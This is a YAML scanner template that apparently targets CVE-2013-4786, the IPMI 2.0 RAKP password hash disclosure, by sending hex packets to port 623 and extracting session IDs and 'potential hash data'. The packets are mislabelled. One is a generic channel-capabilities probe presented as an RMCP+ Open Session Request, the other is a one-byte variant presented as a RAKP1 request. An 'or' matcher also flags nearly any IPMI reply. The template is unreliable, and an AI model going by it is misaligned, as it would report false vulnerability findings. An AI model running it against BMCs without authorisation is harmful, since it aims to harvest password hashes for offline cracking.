id: CVE-2013-4786
info:
  author: geeknik
  classification:
    cve-id: CVE-2013-4786
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-255
  description: The IPMI 2.0 specification supports RMCP+ Authenticated Key-Exchange
    Protocol authentication, which allows remote attackers to obtain password hashes
    and conduct offline password guessing attacks by extracting HMAC from a BMC response
    during authentication.
  name: IPMI 2.0 RAKP Authentication Remote Password Hash Disclosure
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2013-4786
  - http://fish2.com/ipmi/remote-pw-cracking.html
  - https://www.rapid7.com/blog/post/2013/07/02/a-penetration-testers-guide-to-ipmi/
  severity: high
  tags: cve,cve2013,ipmi,rakp,authentication-bypass,network
network:
- extractors:
  - name: ipmi_session_id
    part: body
    regex:
    - ([a-fA-F0-9]{8})(?=.*RAKP)
    - Session.*?([a-fA-F0-9]{8})
    type: regex
  - binary:
    - ([a-fA-F0-9]{40})
    name: potential_hash_data
    part: body
    type: binary
  host:
  - '{{Hostname}}:623'
  inputs:
  - data: 0600ff07000000000000000000092018c88100388e04b5
    description: IPMI RMCP+ Open Session Request
    type: hex
  - data: 0600ff0700000000000000000009201cc88100388e04b5
    description: IPMI RAKP1 Authentication Request
    type: hex
  matchers:
  - binary:
    - 0600ff07
    condition: and
    name: ipmi_rmcp_response
    type: binary
  - condition: and
    name: ipmi_session_response
    regex:
    - \x06\x00\xff\x07.*\x00\x00\x00\x08
    type: regex
  - binary:
    - '060000'
    - ff07
    condition: and
    name: ipmi_rakp_response
    type: binary
  matchers-condition: or
  read-timeout: 10s
